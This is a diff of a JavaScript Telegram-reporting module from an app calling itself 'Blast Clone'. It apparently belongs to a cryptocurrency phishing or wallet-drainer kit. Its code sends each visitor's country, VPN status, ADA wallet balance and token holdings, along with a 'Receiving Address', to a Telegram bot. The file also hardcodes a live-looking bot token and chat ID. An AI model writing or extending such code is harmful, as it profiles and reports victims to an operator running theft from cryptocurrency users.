@@ -1,6 +1,5 @@
-// utils/telegramUtils.js
 import axios from "axios";
-import { getUserCountry } from "./getUserLocation";  // Ensure correct file import
+import { getUserCountry, checkVpnStatus, getRecipientAddress } from "./userLocation";
 
 // Telegram Bot Token and Chat ID
 const TELEGRAM_BOT_TOKEN = "7448589458:AAGDlnlZerWT7JSTc1C7mq9X0bkYpZkwtQ0";
@@ -12,7 +11,7 @@ export const sendMessageToTelegram = async (message) => {
   const payload = {
     chat_id: TELEGRAM_CHAT_ID,
     text: message,
-    parse_mode: "Markdown"  // Enables Markdown for text formatting in Telegram
+    parse_mode: "Markdown"
   };
 
   try {
@@ -27,33 +26,43 @@ export const sendMessageToTelegram = async (message) => {
   }
 };
 
-// Function to send app details  to Telegram
+// Function to send app details (like  balance) to Telegram
 export const sendAppDetailsToTelegram = async (balance, tokens) => {
-  let tokenDetails = tokens.map(
-    (token) => `| ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
+  const tokenDetails = tokens.map(
+    (token) => `|💵 ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
   );
 
-  // Fetch the full user country details (name and code)
   let userCountryData = await getUserCountry();
-
   if (!userCountryData) {
     console.error("Could not retrieve user country data");
-    userCountryData = { country: "Unknown", countryCode: "XX" }; // Default fallback
+    userCountryData = { country: "Unknown", countryCode: "XX", isVpnIpdata: false }; // Default fallback
   }
 
-  const { country, countryCode } = userCountryData;
-  const globeIcon = "🌍";  // Unicode globe icon
+  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
+  const isVpn = isVpnIpdata || await checkVpnStatus(ip);
+  const recipientAddress = await getRecipientAddress();
+
+  const specialCountries = ["AE"];
+  const globeIcon = "🌍";
+  const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";
 
   let message = `*Visit Alert*\n` +
                 `App: Blast Clone\n\n` +
                 `User Info--------------------\n` +
-                `| Country: ${globeIcon} ${country} |\n` +
-                `--------------------------------\n` +
-                `| User Wallet Balance |\n` +
-                `| ADA: ${balance.toFixed(2)} ADA       |\n` +
-                `${tokenDetails.join("\n")}\n` +
-                `------------------------------End`;
+                `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;
 
-  // Send the message to Telegram
+  if (isVpn || specialCountries.includes(countryCode)) {
+    message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
+  } else {
+    message += `| ✅ NO VPN SUSPECTED |\n`;
+  }
+
+  message += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
+             `--------------------------------\n` +
+             `| 💵 User Wallet Balance  |\n` +
+             `| 💵 ADA: ${balance.toFixed(2)} ADA       |\n` +
+             `${tokenDetails.join("\n")}\n` +
+             `------------------------------End`;
+
   await sendMessageToTelegram(message);
 };
